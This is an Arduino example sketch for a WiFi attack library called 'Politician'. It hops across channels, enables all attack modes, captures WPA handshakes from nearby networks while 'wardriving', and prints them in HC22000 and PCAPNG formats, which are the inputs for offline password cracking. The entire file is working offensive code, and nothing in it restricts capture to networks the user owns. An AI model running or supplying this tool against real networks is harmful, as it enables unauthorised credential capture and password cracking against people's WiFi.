#include <Arduino.h>
#include <Politician.h>
#include <PoliticianFormat.h>

using namespace politician;
using namespace politician::format;

Politician engine;
bool pcapHeaderWritten = false;

void onHandshake(const HandshakeRecord &rec) {
    Serial.println("\n[!] HANDSHAKE CAPTURED!");
    Serial.printf("SSID: %s\n", rec.ssid);

    // 1. Export as HC22000 String
    std::string hc22000 = toHC22000(rec);
    Serial.println("--- HC22000 Format ---");
    Serial.println(hc22000.c_str());

    // 2. Export as PCAPNG (hex dump to serial)
    Serial.println("--- PCAPNG Hex Dump ---");
    uint8_t pcapBuf[1024];
    size_t offset = 0;

    // Write global header exactly once per "file"
    if (!pcapHeaderWritten) {
        offset += writePcapngGlobalHeader(pcapBuf);
        pcapHeaderWritten = true;
    }

    // Write the actual Enhanced Packet Blocks for this handshake
    size_t written = writePcapngRecord(rec, pcapBuf + offset, sizeof(pcapBuf) - offset);
    if (written > 0) {
        offset += written;
    }

    // Dump as hex
    for (size_t i = 0; i < offset; i++) {
        Serial.printf("%02X", pcapBuf[i]);
    }
    Serial.println("\n----------------------");
    
    // Note: In a real application, you might append `pcapBuf` (binary) 
    // to an SD card file instead of hex dumping it.
}

void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("\n--- Politician Export Example ---");

    engine.setEapolCallback(onHandshake);

    Config cfg;
    if (engine.begin(cfg) != politician::OK) {
        Serial.println("WiFi Init Failed!");
        while(1) delay(100);
    }
    
    engine.startHopping();
    engine.setAttackMask(ATTACK_ALL);

    Serial.println("Wardriving started...");
}

void loop() {
    engine.tick();
}
